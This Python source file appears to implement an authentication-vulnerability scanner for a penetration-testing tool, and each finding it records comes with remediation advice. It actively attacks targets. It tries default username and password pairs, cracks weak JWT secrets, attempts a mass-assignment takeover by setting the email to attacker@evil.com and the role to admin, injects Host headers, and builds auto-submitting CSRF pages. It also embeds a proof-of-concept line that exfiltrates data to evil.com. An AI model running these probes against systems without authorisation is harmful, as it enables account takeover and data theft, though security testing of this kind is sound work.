
from __future__ import annotations

import re
import json
import time
import hashlib
from typing import Any
from urllib.parse import urljoin, urlparse, urlencode, parse_qs

import requests
from bs4 import BeautifulSoup

from vapt.utils.helpers import sanitize_target

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
    ("administrator", "administrator"), ("test", "test"),
    ("user", "user"), ("guest", "guest"), ("demo", "demo"),
    ("admin", ""), ("root", ""), ("admin", "admin1234"),
    ("admin", "P@ssw0rd"), ("admin", "changeme"),
]

AUTH_ENDPOINTS = {
    "login": [
        "/login", "/signin", "/auth/login", "/api/login",
        "/api/auth/login", "/api/v1/auth/login", "/api/v2/auth/login",
        "/admin/login", "/wp-login.php", "/user/login",
        "/account/login", "/session/new",
    ],
    "register": [
        "/register", "/signup", "/api/register", "/api/auth/register",
        "/api/v1/auth/signup", "/create-account", "/join",
    ],
    "password_reset": [
        "/password/reset", "/forgot-password", "/api/password/reset",
        "/api/auth/forgot", "/api/v1/password/reset",
        "/reset-password", "/account/recover",
    ],
    "oauth": [
        "/oauth/authorize", "/oauth/token", "/oauth/callback",
        "/auth/callback", "/api/oauth/authorize",
        "/oauth2/authorize", "/oauth2/token",
        "/.well-known/openid-configuration",
    ],
    "admin": [
        "/admin", "/admin/", "/administrator", "/dashboard",
        "/api/admin", "/api/users", "/api/v1/users",
        "/api/v1/admin", "/internal", "/management",
    ],
    "profile": [
        "/api/user", "/api/me", "/api/profile", "/api/account",
        "/api/v1/user", "/api/v1/me", "/user/profile",
        "/api/users/1", "/api/users/2", "/api/v1/users/1",
    ],
}


class AuthScanner:

    def __init__(
        self,
        session: requests.Session | None = None,
        timeout: int = 10,
        safety_config: dict | None = None,
    ) -> None:
        self.session = session or requests.Session()
        self.session.headers.setdefault("User-Agent", "VAPT-CLI/4.0 AuthScanner")
        self.timeout = timeout
        self.safety_config = safety_config or {}
        self.findings: list[dict] = []

    def run(self, target: str) -> dict[str, Any]:
        target = sanitize_target(target)
        if not target.startswith("http"):
            target = f"https://{target}"

        sc = self.safety_config

        endpoints = self._discover_endpoints(target)

        self._check_csrf(target)
        self._check_cors(target)
        self._check_idor(target, endpoints)
        self._check_jwt_vulns(target)
        self._check_session_fixation(target, endpoints)
        self._check_password_reset(target, endpoints)
        self._check_oauth_misconfig(target, endpoints)
        self._check_host_header_injection(target, endpoints)
        self._check_privilege_escalation(target, endpoints)

        if not sc.get("skip_default_creds") and not sc.get("skip_brute_force"):
            self._check_default_creds(target, endpoints)
        if not sc.get("skip_mfa_bypass"):
            self._check_mfa_bypass(target, endpoints)
        self._check_account_takeover(target, endpoints)

        return {"findings": self.findings}


    def _discover_endpoints(self, target: str) -> dict[str, list[str]]:
        found: dict[str, list[str]] = {}

        for category, paths in AUTH_ENDPOINTS.items():
            hits = []
            for path in paths:
                url = urljoin(target, path)
                try:
                    resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                    if resp.status_code not in (404, 502, 503):
                        hits.append(url)
                except Exception:
                    pass
            if hits:
                found[category] = hits

        return found


    def _check_csrf(self, target: str) -> None:
        try:
            resp = self.session.get(target, timeout=self.timeout)
            soup = BeautifulSoup(resp.text, "html.parser")

            forms = soup.find_all("form", method=re.compile(r"post", re.IGNORECASE))
            if not forms:
                forms = [f for f in soup.find_all("form") if not f.get("method") or f.get("method", "").lower() != "get"]

            for form in forms:
                action = form.get("action", "")
                abs_action = urljoin(target, action) if action else target

                has_csrf = False
                csrf_names = ["csrf", "token", "_token", "authenticity_token",
                              "csrfmiddlewaretoken", "csrf_token", "__RequestVerificationToken",
                              "_csrf", "nonce", "anti-csrf"]

                for inp in form.find_all("input", type="hidden"):
                    name = (inp.get("name", "") or "").lower()
                    if any(csrf_name in name for csrf_name in csrf_names):
                        has_csrf = True
                        break

                meta_csrf = soup.find("meta", attrs={"name": re.compile(r"csrf", re.IGNORECASE)})
                if meta_csrf:
                    has_csrf = True

                if not has_csrf:
                    fields = [inp.get("name", "unnamed") for inp in form.find_all(["input", "textarea", "select"])]
                    state_changing = any(f in str(fields).lower() for f in
                        ["password", "email", "delete", "update", "transfer",
                         "payment", "settings", "profile", "admin"])

                    if state_changing or len(fields) > 1:
                        self._add_finding(
                            vuln_id="AUTH-002",
                            title=f"Missing CSRF Token on {urlparse(abs_action).path}",
                            severity="High" if state_changing else "Medium",
                            cvss=7.5 if state_changing else 5.5,
                            url=abs_action,
                            category="csrf",
                            evidence=f"Form action: {abs_action}\nMethod: POST\nFields: {', '.join(fields[:10])}\nNo CSRF token found in hidden fields or meta tags.",
                            payload=self._generate_csrf_poc_html(abs_action, form),
                            remediation="Add CSRF tokens to all state-changing forms. Use SameSite=Strict on session cookies. Implement double-submit cookie pattern.",
                            confidence=0.90,
                            poc=f"1. Create attacker page with auto-submitting form to {abs_action}\n"
                                f"2. Victim visits attacker page while logged in\n"
                                f"3. Form submits cross-origin without CSRF check\n"
                                f"4. Action performed on victim's behalf\n\n"
                                f"PoC HTML:\n{self._generate_csrf_poc_html(abs_action, form)}",
                        )
        except Exception:
            pass

    def _generate_csrf_poc_html(self, action: str, form) -> str:
        fields_html = ""
        for inp in form.find_all(["input", "textarea"]):
            name = inp.get("name", "")
            value = inp.get("value", "evil")
            if name:
                fields_html += f'    <input type="hidden" name="{name}" value="{value}">\n'

        return f"""<html>
<body>
<h1>CSRF PoC</h1>
<form id="csrf" action="{action}" method="POST">
{fields_html}    <input type="submit" value="Submit">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>"""


    def _check_cors(self, target: str) -> None:
        test_origins = [
            "https://evil.com",
            f"https://{urlparse(target).netloc}.evil.com",
            f"https://sub.{urlparse(target).netloc}",
            "null",
            "https://localhost",
        ]

        for origin in test_origins:
            try:
                resp = self.session.get(
                    target,
                    headers={"Origin": origin},
                    timeout=self.timeout,
                )

                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                if acao and acao != "*":
                    if origin in acao and acac.lower() == "true":
                        self._add_finding(
                            vuln_id="AUTH-011",
                            title=f"CORS Credential Theft — Origin: {origin}",
                            severity="Critical" if "evil.com" in origin else "High",
                            cvss=8.5,
                            url=target,
                            category="cors",
                            evidence=f"Origin: {origin}\nAccess-Control-Allow-Origin: {acao}\n"
                                     f"Access-Control-Allow-Credentials: {acac}\n"
                                     f"Server reflects attacker's origin with credentials allowed.",
                            payload=f"Origin: {origin}",
                            remediation="Use strict allowlist for CORS origins. Never reflect Origin header directly. Avoid Access-Control-Allow-Credentials: true with reflected origins.",
                            confidence=0.95,
                            poc=f"1. Host attacker page:\n"
                                f'   fetch("{target}", {{credentials: "include", headers: {{origin: "{origin}"}}}}).then(r => r.text()).then(d => fetch("https://evil.com/steal?data=" + d))\n'
                                f"2. Victim visits page → authenticated data stolen",
                        )
                        return

                if acao == "*":
                    self._add_finding(
                        vuln_id="AUTH-011",
                        title="CORS Wildcard Origin (*)",
                        severity="Medium",
                        cvss=5.0,
                        url=target,
                        category="cors",
                        evidence=f"Access-Control-Allow-Origin: *\nAny origin can read responses.",
                        payload="Origin: https://evil.com",
                        remediation="Replace wildcard CORS with specific allowed origins. Use Access-Control-Allow-Origin with your domain only.",
                        confidence=0.95,
                        poc=f"1. Any website can read {target} responses\n2. Does not work with credentials, but leaks non-auth data",
                    )
                    return

            except Exception:
                continue


    def _check_default_creds(self, target: str, endpoints: dict[str, list[str]]) -> None:
        login_urls = endpoints.get("login", [])

        for url in login_urls[:3]:
            try:
                resp = self.session.get(url, timeout=self.timeout)
                soup = BeautifulSoup(resp.text, "html.parser")

                forms = soup.find_all("form")
                form = None
                for f in forms:
                    inputs = [i.get("name", "").lower() for i in f.find_all("input")]
                    if any("user" in i or "email" in i or "login" in i for i in inputs):
                        form = f
                        break

                if not form:
                    continue

                user_field = None
                pass_field = None
                for inp in form.find_all("input"):
                    name = inp.get("name", "").lower()
                    itype = inp.get("type", "").lower()
                    if "user" in name or "email" in name or "login" in name:
                        user_field = inp.get("name")
                    elif itype == "password" or "pass" in name:
                        pass_field = inp.get("name")

                if not user_field or not pass_field:
                    continue

                action = urljoin(url, form.get("action", ""))

                csrf_field = None
                csrf_value = None
                for inp in form.find_all("input", type="hidden"):
                    name = inp.get("name", "").lower()
                    if any(t in name for t in ["csrf", "token", "_token", "nonce"]):
                        csrf_field = inp.get("name")
                        csrf_value = inp.get("value", "")
                        break

                for username, password in DEFAULT_CREDS[:8]:
                    data = {user_field: username, pass_field: password}
                    if csrf_field:
                        data[csrf_field] = csrf_value

                    try:
                        login_resp = self.session.post(
                            action, data=data,
                            timeout=self.timeout,
                            allow_redirects=False,
                        )

                        is_success = False
                        if login_resp.status_code in (301, 302, 303):
                            location = login_resp.headers.get("Location", "")
                            if "dashboard" in location or "admin" in location or "home" in location:
                                is_success = True
                        if login_resp.status_code == 200:
                            body = login_resp.text.lower()
                            if any(w in body for w in ["dashboard", "welcome", "logout", "success"]):
                                if not any(w in body for w in ["invalid", "error", "failed", "incorrect"]):
                                    is_success = True

                        if is_success:
                            self._add_finding(
                                vuln_id="AUTH-001",
                                title=f"Default Credentials: {username}:{password}",
                                severity="Critical",
                                cvss=9.5,
                                url=action,
                                category="broken_auth",
                                evidence=f"Login endpoint: {action}\n"
                                         f"Credentials: {username}:{password}\n"
                                         f"Response: {login_resp.status_code}\n"
                                         f"Login appears successful (redirect to dashboard or success indicators)",
                                payload=f"{user_field}={username}&{pass_field}={password}",
                                remediation="Change default credentials immediately. Implement account lockout. Require strong passwords. Enable MFA.",
                                confidence=0.90,
                                poc=f"1. Navigate to {url}\n2. Enter username: {username}\n3. Enter password: {password}\n4. Login succeeds → full system access",
                            )
                            return
                    except Exception:
                        continue

            except Exception:
                continue


    def _check_idor(self, target: str, endpoints: dict[str, list[str]]) -> None:
        profile_urls = endpoints.get("profile", [])

        for url in profile_urls:
            parsed = urlparse(url)
            path = parsed.path

            id_pattern = re.search(r"/(\d+)/?$", path)
            if id_pattern:
                original_id = int(id_pattern.group(1))
                test_ids = [original_id + 1, original_id - 1, original_id + 100, 0, 999999]

                try:
                    original_resp = self.session.get(url, timeout=self.timeout)
                    original_status = original_resp.status_code
                    original_length = len(original_resp.text)
                except Exception:
                    continue

                for test_id in test_ids:
                    test_url = re.sub(r"/\d+/?$", f"/{test_id}", url)
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout)

                        if (resp.status_code == 200
                            and abs(len(resp.text) - original_length) > 50
                            and resp.status_code != 404):

                            if not any(e in resp.text.lower() for e in ["not found", "error", "forbidden"]):
                                self._add_finding(
                                    vuln_id="AUTH-004",
                                    title=f"IDOR on {urlparse(test_url).path}",
                                    severity="High",
                                    cvss=7.5,
                                    url=test_url,
                                    category="idor",
                                    evidence=f"Original: {url} ({original_status}, {original_length} bytes)\n"
                                             f"Accessed: {test_url} ({resp.status_code}, {len(resp.text)} bytes)\n"
                                             f"Different user's data accessible by changing ID parameter.",
                                    payload=f"Changed ID from {original_id} to {test_id}",
                                    remediation="Implement authorization checks for every data access. Use UUIDs instead of sequential IDs. Verify object ownership server-side.",
                                    confidence=0.80,
                                    poc=f"1. Authenticate as normal user\n"
                                        f"2. Access {url}\n"
                                        f"3. Change ID to {test_id}: {test_url}\n"
                                        f"4. Different user's data returned",
                                )
                                return
                    except Exception:
                        continue


    def _check_jwt_vulns(self, target: str) -> None:
        try:
            resp = self.session.get(target, timeout=self.timeout)

            jwt_cookie = None
            for cookie in self.session.cookies:
                if re.match(r"eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.", cookie.value):
                    jwt_cookie = (cookie.name, cookie.value)
                    break

            jwt_in_body = re.search(
                r"(eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+)",
                resp.text,
            )

            jwt_token = None
            if jwt_cookie:
                jwt_token = jwt_cookie[1]
            elif jwt_in_body:
                jwt_token = jwt_in_body.group(1)

            if jwt_token:
                self._analyze_jwt(target, jwt_token)

        except Exception:
            pass

    def _analyze_jwt(self, target: str, token: str) -> None:
        import base64

        parts = token.split(".")
        if len(parts) != 3:
            return

        try:
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            alg = header.get("alg", "")
            if alg in ("none", "None", "NONE", "nOnE"):
                self._add_finding(
                    vuln_id="AUTH-005",
                    title="JWT Algorithm None — Signature Not Required",
                    severity="Critical",
                    cvss=10.0,
                    url=target,
                    category="jwt",
                    evidence=f"Algorithm: {alg}\nHeader: {json.dumps(header)}\nPayload: {json.dumps(payload)}",
                    payload=f"Modify JWT payload, set alg=none, remove signature",
                    remediation="Never accept alg=none. Use asymmetric algorithms (RS256/ES256). Validate algorithm in server config, not from token.",
                    confidence=0.95,
                    poc=f"1. Decode JWT: {token[:50]}...\n2. Change header alg to 'none'\n3. Modify payload (e.g., admin=true)\n4. Send with empty signature\n5. Server accepts without verification",
                )

            if alg in ("HS256", "HS384", "HS512"):
                weak_secrets = ["secret", "password", "key", "jwt", "123456", "changeme",
                                "admin", "test", "default"]
                import hmac

                for secret in weak_secrets:
                    try:
                        signing_input = f"{parts[0]}.{parts[1]}".encode()
                        hash_func = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}[alg]
                        expected_sig = base64.urlsafe_b64encode(
                            hmac.new(secret.encode(), signing_input, hash_func).digest()
                        ).rstrip(b"=").decode()

                        if expected_sig == parts[2]:
                            self._add_finding(
                                vuln_id="AUTH-005",
                                title=f"JWT Weak Secret: '{secret}'",
                                severity="Critical",
                                cvss=9.5,
                                url=target,
                                category="jwt",
                                evidence=f"Algorithm: {alg}\nSecret: {secret}\nToken validated with weak secret.\nPayload: {json.dumps(payload)}",
                                payload=f"JWT signed with secret: {secret}",
                                remediation="Use strong, random secrets (256+ bits). Consider asymmetric signing (RS256). Rotate secrets regularly.",
                                confidence=0.98,
                                poc=f"1. JWT token uses {alg} with secret '{secret}'\n2. Forge new token: modify payload, re-sign with '{secret}'\n3. Server accepts forged token\n4. Full account takeover possible",
                            )
                            return
                    except Exception:
                        continue

            sensitive_keys = ["password", "secret", "ssn", "credit_card", "cc_number"]
            exposed = [k for k in payload.keys() if any(s in k.lower() for s in sensitive_keys)]
            if exposed:
                self._add_finding(
                    vuln_id="AUTH-005",
                    title=f"JWT Contains Sensitive Data: {', '.join(exposed)}",
                    severity="High",
                    cvss=7.0,
                    url=target,
                    category="jwt",
                    evidence=f"Sensitive keys in JWT payload: {', '.join(exposed)}\nFull payload: {json.dumps(payload)}",
                    payload="Base64-decode the JWT to view sensitive data",
                    remediation="Never store sensitive data in JWT payload (it's only base64-encoded, not encrypted). Use server-side sessions for sensitive data.",
                    confidence=0.95,
                    poc=f"1. Get JWT from cookie/response\n2. Base64-decode middle section\n3. Sensitive fields visible: {', '.join(exposed)}",
                )

            if "exp" not in payload:
                self._add_finding(
                    vuln_id="AUTH-005",
                    title="JWT Without Expiration (no 'exp' claim)",
                    severity="Medium",
                    cvss=5.5,
                    url=target,
                    category="jwt",
                    evidence=f"JWT payload has no 'exp' field.\nPayload: {json.dumps(payload)}\nToken never expires — stolen tokens are valid forever.",
                    payload="JWT without exp claim",
                    remediation="Always set exp claim with short TTL (15-60 minutes). Use refresh tokens for long-lived sessions.",
                    confidence=0.90,
                    poc=f"1. Steal/obtain JWT token\n2. Token has no expiration\n3. Use forever for persistent access",
                )

        except Exception:
            pass


    def _check_session_fixation(self, target: str, endpoints: dict[str, list[str]]) -> None:
        login_urls = endpoints.get("login", [])

        for url in login_urls[:2]:
            try:
                pre_session = requests.Session()
                resp1 = pre_session.get(url, timeout=self.timeout)
                pre_cookies = dict(pre_session.cookies)

                if not pre_cookies:
                    continue

                for cookie in pre_session.cookies:
                    flags = []
                    if not cookie.secure:
                        flags.append("Missing Secure flag")
                    if not cookie.has_nonstandard_attr("HttpOnly"):
                        flags.append("Missing HttpOnly flag")

                    samesite = cookie.get_nonstandard_attr("SameSite")
                    if not samesite or samesite.lower() == "none":
                        flags.append(f"SameSite={samesite or 'not set'}")

                    if flags:
                        self._add_finding(
                            vuln_id="AUTH-006",
                            title=f"Session Cookie '{cookie.name}' Missing Security Flags",
                            severity="Medium",
                            cvss=5.0,
                            url=url,
                            category="session",
                            evidence=f"Cookie: {cookie.name}\nIssues: {', '.join(flags)}\nDomain: {cookie.domain}\nPath: {cookie.path}",
                            payload=f"Cookie '{cookie.name}' flags: {', '.join(flags)}",
                            remediation="Set Secure, HttpOnly, and SameSite=Strict on all session cookies.",
                            confidence=0.95,
                            poc=f"1. Observe session cookie: {cookie.name}\n2. Missing: {', '.join(flags)}\n3. Without Secure: cookie sent over HTTP\n4. Without HttpOnly: accessible via XSS (document.cookie)",
                        )

            except Exception:
                continue


    def _check_password_reset(self, target: str, endpoints: dict[str, list[str]]) -> None:
        reset_urls = endpoints.get("password_reset", [])

        for url in reset_urls[:2]:
            try:
                resp = self.session.get(url, timeout=self.timeout)
                soup = BeautifulSoup(resp.text, "html.parser")

                forms = soup.find_all("form")
                for form in forms:
                    inputs = [i.get("name", "").lower() for i in form.find_all("input")]
                    if any("email" in i or "user" in i for i in inputs):
                        action = urljoin(url, form.get("action", url))

                        email_field = None
                        for inp in form.find_all("input"):
                            name = inp.get("name", "").lower()
                            if "email" in name or "user" in name:
                                email_field = inp.get("name")
                                break

                        if email_field:
                            try:
                                resp2 = self.session.post(
                                    action,
                                    data={email_field: "test@example.com"},
                                    headers={"Host": "evil.com"},
                                    timeout=self.timeout,
                                    allow_redirects=False,
                                )

                                if resp2.status_code in (200, 301, 302):
                                    self._add_finding(
                                        vuln_id="AUTH-012",
                                        title="Host Header Injection on Password Reset",
                                        severity="High",
                                        cvss=8.0,
                                        url=action,
                                        category="host_header",
                                        evidence=f"Password reset at: {action}\n"
                                                 f"Injected Host: evil.com\n"
                                                 f"Response: {resp2.status_code}\n"
                                                 f"If reset email uses Host header for link, token is sent to attacker.",
                                        payload=f"Host: evil.com",
                                        remediation="Use a hardcoded domain for password reset links. Never derive URLs from the Host header. Validate Host header against allowlist.",
                                        confidence=0.75,
                                        poc=f"1. Go to {url}\n"
                                            f"2. Submit password reset with intercepted request\n"
                                            f"3. Modify Host header to evil.com\n"
                                            f"4. Reset email contains: https://evil.com/reset?token=XXX\n"
                                            f"5. Token sent to attacker's domain",
                                    )
                            except Exception:
                                pass

            except Exception:
                continue


    def _check_oauth_misconfig(self, target: str, endpoints: dict[str, list[str]]) -> None:
        oauth_urls = endpoints.get("oauth", [])

        well_known_url = urljoin(target, "/.well-known/openid-configuration")
        try:
            resp = self.session.get(well_known_url, timeout=self.timeout)
            if resp.status_code == 200:
                try:
                    config = resp.json()
                    response_types = config.get("response_types_supported", [])
                    if "token" in response_types:
                        self._add_finding(
                            vuln_id="AUTH-003",
                            title="OAuth Implicit Flow Supported",
                            severity="Medium",
                            cvss=5.5,
                            url=well_known_url,
                            category="oauth",
                            evidence=f"OpenID config supports implicit flow (response_type=token)\n"
                                     f"Allowed types: {response_types}\n"
                                     f"Implicit flow leaks tokens in URL fragment.",
                            payload="response_type=token",
                            remediation="Disable implicit flow. Use Authorization Code flow with PKCE. Remove 'token' from response_types_supported.",
                            confidence=0.90,
                            poc=f"1. Discovery: {well_known_url}\n2. response_types_supported includes 'token'\n3. Tokens leak via browser history, Referer header, logs",
                        )
                except (json.JSONDecodeError, ValueError):
                    pass
        except Exception:
            pass

        for url in oauth_urls:
            try:
                parsed = urlparse(url)
                if "authorize" in parsed.path:
                    test_params = {
                        "client_id": "test",
                        "redirect_uri": "https://evil.com/callback",
                        "response_type": "code",
                        "scope": "openid",
                    }
                    test_url = f"{url}?{urlencode(test_params)}"

                    resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)

                    if resp.status_code in (301, 302, 303) and "evil.com" in resp.headers.get("Location", ""):
                        self._add_finding(
                            vuln_id="AUTH-003",
                            title="OAuth redirect_uri Open Redirect",
                            severity="Critical",
                            cvss=9.0,
                            url=url,
                            category="oauth",
                            evidence=f"OAuth authorize endpoint: {url}\n"
                                     f"redirect_uri=https://evil.com/callback was accepted\n"
                                     f"Location: {resp.headers.get('Location', '')[:200]}\n"
                                     f"Authorization code/token redirected to attacker.",
                            payload="redirect_uri=https://evil.com/callback",
                            remediation="Strict redirect_uri validation. Exact match only (no wildcards). Pre-register all redirect URIs.",
                            confidence=0.95,
                            poc=f"1. Craft OAuth URL: {test_url}\n2. User authorizes\n3. Code/token sent to https://evil.com/callback\n4. Attacker exchanges code for access token",
                        )
            except Exception:
                continue


    def _check_mfa_bypass(self, target: str, endpoints: dict[str, list[str]]) -> None:
        mfa_paths = [
            "/api/auth/2fa", "/auth/2fa", "/2fa/verify", "/api/otp/verify",
            "/verify-otp", "/api/mfa/verify", "/mfa/challenge",
        ]

        for path in mfa_paths:
            url = urljoin(target, path)
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                if resp.status_code in (404, 502, 503):
                    continue

                for admin_path in ["/admin", "/dashboard", "/api/me", "/api/user"]:
                    admin_url = urljoin(target, admin_path)
                    try:
                        resp2 = self.session.get(admin_url, timeout=self.timeout)
                        if resp2.status_code == 200 and len(resp2.text) > 100:
                            if not any(e in resp2.text.lower() for e in ["login", "sign in", "unauthorized"]):
                                self._add_finding(
                                    vuln_id="AUTH-008",
                                    title=f"Potential 2FA Bypass — {admin_path} accessible",
                                    severity="Critical",
                                    cvss=9.0,
                                    url=admin_url,
                                    category="mfa_bypass",
                                    evidence=f"2FA endpoint exists: {url}\n"
                                             f"But {admin_url} is accessible without completing 2FA.\n"
                                             f"Response: {resp2.status_code} ({len(resp2.text)} bytes)",
                                    payload=f"Access {admin_url} directly, skipping 2FA at {url}",
                                    remediation="Enforce 2FA completion before granting access to any protected resource. Use server-side session state to track 2FA status.",
                                    confidence=0.70,
                                    poc=f"1. Begin login at {target}\n2. Complete password step\n3. Skip 2FA at {url}\n4. Navigate directly to {admin_url}\n5. Access granted without 2FA",
                                )
                                return
                    except Exception:
                        continue
            except Exception:
                continue


    def _check_privilege_escalation(self, target: str, endpoints: dict[str, list[str]]) -> None:
        admin_urls = endpoints.get("admin", [])

        for url in admin_urls:
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code == 200:
                    body = resp.text.lower()
                    admin_indicators = ["dashboard", "admin panel", "management",
                                       "users", "configuration", "settings",
                                       "system", "delete", "modify"]
                    login_indicators = ["login", "sign in", "username", "password",
                                       "authenticate"]

                    has_admin = any(i in body for i in admin_indicators)
                    has_login = any(i in body for i in login_indicators)

                    if has_admin and not has_login:
                        self._add_finding(
                            vuln_id="AUTH-009",
                            title=f"Unauthenticated Admin Access: {urlparse(url).path}",
                            severity="Critical",
                            cvss=9.5,
                            url=url,
                            category="privilege_escalation",
                            evidence=f"Admin endpoint: {url}\n"
                                     f"Status: {resp.status_code}\n"
                                     f"Admin indicators found: {[i for i in admin_indicators if i in body]}\n"
                                     f"No login/authentication required.",
                            payload=f"GET {url}",
                            remediation="Implement authentication and role-based access control on all admin endpoints. Use middleware to enforce auth checks.",
                            confidence=0.85,
                            poc=f"1. Visit {url} without authentication\n2. Admin panel/dashboard is accessible\n3. Full administrative access without credentials",
                        )
            except Exception:
                continue


    def _check_account_takeover(self, target: str, endpoints: dict[str, list[str]]) -> None:
        profile_urls = endpoints.get("profile", [])

        for url in profile_urls[:3]:
            try:
                resp = self.session.put(
                    url,
                    json={"email": "attacker@evil.com", "role": "admin"},
                    timeout=self.timeout,
                )

                if resp.status_code in (200, 201):
                    try:
                        body = resp.json()
                        if isinstance(body, dict):
                            if body.get("email") == "attacker@evil.com" or body.get("role") == "admin":
                                self._add_finding(
                                    vuln_id="AUTH-010",
                                    title=f"Account Takeover via Mass Assignment on {urlparse(url).path}",
                                    severity="Critical",
                                    cvss=9.5,
                                    url=url,
                                    category="account_takeover",
                                    evidence=f"Endpoint: {url}\n"
                                             f"Payload: {json.dumps({'email': 'attacker@evil.com', 'role': 'admin'})}\n"
                                             f"Response: {json.dumps(body)[:500]}\n"
                                             f"Server accepted email/role change without proper authorization.",
                                    payload='{"email": "attacker@evil.com", "role": "admin"}',
                                    remediation="Implement strict allowlisting for updatable user fields. Never allow role/email changes without re-authentication. Use separate admin-only endpoints for privilege changes.",
                                    confidence=0.85,
                                    poc=f"1. Send PUT {url} with body: {{\"email\": \"attacker@evil.com\", \"role\": \"admin\"}}\n"
                                        f"2. Server accepts the change\n"
                                        f"3. Account email changed → attacker can reset password\n"
                                        f"4. Role elevated to admin → vertical privilege escalation",
                                )
                    except (json.JSONDecodeError, ValueError):
                        pass
            except Exception:
                continue


    def _check_host_header_injection(self, target: str, endpoints: dict[str, list[str]]) -> None:
        try:
            resp = self.session.get(
                target,
                headers={"Host": "evil.com", "X-Forwarded-Host": "evil.com"},
                timeout=self.timeout,
            )

            if "evil.com" in resp.text:
                self._add_finding(
                    vuln_id="AUTH-012",
                    title="Host Header Reflection in Page Content",
                    severity="Medium",
                    cvss=5.5,
                    url=target,
                    category="host_header",
                    evidence=f"Injected Host: evil.com\n"
                             f"'evil.com' reflected in response body.\n"
                             f"Can be used for cache poisoning, password reset poisoning, or SSRF.",
                    payload="Host: evil.com",
                    remediation="Never use Host header to construct URLs. Use server configuration for canonical URLs. Validate Host against allowlist.",
                    confidence=0.80,
                    poc=f"1. Send: curl -H 'Host: evil.com' {target}\n2. 'evil.com' appears in response\n3. Cache poisoning: inject malicious links for all users",
                )
        except Exception:
            pass


    def _add_finding(self, **kwargs: Any) -> None:
        key = (kwargs.get("vuln_id"), kwargs.get("url"), kwargs.get("title", "")[:60])
        dedup = hashlib.md5(str(key).encode()).hexdigest()

        for existing in self.findings:
            if existing.get("_dedup") == dedup:
                return

        finding = {
            "vuln_id": kwargs.get("vuln_id", "AUTH-000"),
            "title": kwargs.get("title", ""),
            "severity": kwargs.get("severity", "High"),
            "cvss_score": kwargs.get("cvss", 7.0),
            "url": kwargs.get("url", ""),
            "category": kwargs.get("category", "auth"),
            "evidence": kwargs.get("evidence", ""),
            "payload": kwargs.get("payload", ""),
            "remediation": kwargs.get("remediation", ""),
            "confidence": kwargs.get("confidence", 0.7),
            "validated": True,
            "poc": kwargs.get("poc", ""),
            "request": f"POST {kwargs.get('url', '')} HTTP/1.1",
            "scanner": "AuthScanner",
            "_dedup": dedup,
        }
        self.findings.append(finding)
